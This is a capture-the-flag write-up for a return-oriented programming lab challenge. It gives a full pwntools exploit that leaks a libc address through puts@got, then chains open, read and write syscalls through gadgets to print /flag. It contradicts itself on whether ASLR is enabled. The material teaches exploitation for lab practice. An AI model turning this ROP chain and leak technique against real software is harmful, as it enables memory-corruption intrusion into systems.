# Return Oriented Programming 4.0

Running the provided file we knew that the ASLR is disabled. Next, debugging the file in GDB shows us that there are no functions to return to. 

![[Level4.0-1.png]]

Moreover, NX is enabled, so we can't execute shellcode from the stack. However, we can see that there is a function called `free_gadgets`. Then, we can use `ROPgadget` to check whether there are any good gadgets to use.

![[Level4.0-2.png]]

Finally, we can check whether there are any `syscall` gadgets to use.

![[Level4.0-3.png]]

Bingo! Since `pop rax`, `pop rdi`, `pop rsi`, `pop rdx`, and `syscall` are available, we can use `open`-`read`-`write` syscalls to read the `/flag` file. But since we can't create our custom assembly shellcode, we need to find useful gadgets from the executable file and the libc file. Now, we just need to assemble the payload.

First, load the library and files used then start the process.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level4.0")
libc = elf.libc

io = process()
```

Next, find the gadgets (we can use `pwn` to simplify the payload). We should also find the offset, which is 88.

```python
POP_RAX = next(elf.search(asm('pop rax; ret')))
POP_RDI = next(elf.search(asm('pop rdi; ret')))
POP_RSI = next(elf.search(asm('pop rsi; ret')))
POP_RDX = next(elf.search(asm('pop rdx; ret')))
SYSCALL = next(elf.search(asm('syscall; ret')))

offset = 88
```

Then, send the first payload to leak the base LIBC address (since ASLR is enabled). 

```python
payload = flat(
    b'A' * offset,         # padding to return address
    POP_RDI,               # pop_rdi address (to change the rdi register)
    elf.got['puts'],       # set rdi = got address of puts
    elf.plt['puts'],       # call puts() function from plt to puts the puts@got address
    elf.sym['challenge']   # return to challenge()
)

io.sendline(payload)
```

Now that we got the `puts@got` address, we can calculate the LIBC base address as follows

```python
io.recvuntil(b'Leaving!\n')

puts_leak = u64(io.recv(6) + b'\x00\x00')
libc.address = puts_leak - libc.sym['puts']
```

Now, since the `open` syscall returns the file descriptor to the register `rax`, which is used to differentiate between syscalls, we need to store the `fd` to another register. However, there aren't any gadgets usable from the executable file. But, there are `xchg` gadgets in the libc file, which is why we need to calculate the libc base address. 

```python
XCHG = next(libc.search(asm('xchg edi, eax; ret')))
```

Then, since the base stack address is given, we can use it to store the string `"/flag"`. 

```python
io.recvuntil(b'located at: 0x')

stack_leak = int(io.recv(12), 16)
```

Finally, we can use this [website](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) for the list of available syscalls to assemble the final payload

```python
payload = flat(
    # Overflow buffer, /flag to point from open()
    b'/flag\x00'.ljust(offset, b'A'),

    # open()
    POP_RAX,        # rax to 2, syscall number for open()
    0x2,
    POP_RDI,        # point to "/flag" string
    stack_leak,
    POP_RSI,        # rsi to 0
    0x0,
    POP_RDX,        # rdx to 0
    0x0,
    SYSCALL,        # calling syscall, fd is now stored in rax

    # save buffer
    XCHG,           # now we the value in rax and rdi

    # read()
    POP_RAX,        # rax to 0, syscall number for read()
    0x0,
    POP_RSI,        # rsi to a RW space in elf, we can use the stack
    stack_leak,
    POP_RDX,        # rdx to 0x100 (size of buffer)
    0x100,
    SYSCALL,        # calling syscall, now the content is saved in the stack

    # write()
    POP_RAX,        # rax to 1, syscall number for write()
    0x1,
    POP_RDI,        # rdi to 1, fd 1 -> stdout
    0x1,
    SYSCALL         # calling syscall, flag should be written to the terminal
)

io.sendline(payload)
```

Final payload:

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level4.0")
libc = elf.libc

io = process()

print("===== STARTING EXPLOIT =====")

POP_RAX = next(elf.search(asm('pop rax; ret')))
POP_RDI = next(elf.search(asm('pop rdi; ret')))
POP_RSI = next(elf.search(asm('pop rsi; ret')))
POP_RDX = next(elf.search(asm('pop rdx; ret')))
SYSCALL = next(elf.search(asm('syscall; ret')))

offset = 88

payload = flat(
    b'A' * offset,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['challenge']
)

io.sendline(payload)

io.recvuntil(b'Leaving!\n')

puts_leak = u64(io.recv(6) + b'\x00\x00')
libc.address = puts_leak - libc.sym['puts']

XCHG = next(libc.search(asm('xchg edi, eax; ret')))

io.recvuntil(b'located at: 0x')

stack_leak = int(io.recv(12), 16)

payload = flat(
    # Overflow buffer, /flag to point from open()
    b'/flag\x00'.ljust(offset, b'A'),

    # open()
    POP_RAX,
    0x2,
    POP_RDI,
    stack_leak,
    POP_RSI,
    0x0,
    POP_RDX,
    0x0,
    SYSCALL,

    # save buffer
    XCHG,

    # read()
    POP_RAX,
    0x0,
    POP_RSI,
    stack_leak,
    POP_RDX,
    0x100,
    SYSCALL,

    # write()
    POP_RAX,
    0x1,
    POP_RDI,
    0x1,
    SYSCALL
)

io.sendline(payload)

io.recvuntil(b'Leaving!\n')
print(f"Flag: {io.recvuntil(b'}')}")
```

Flag:

![[Level4.0.png]]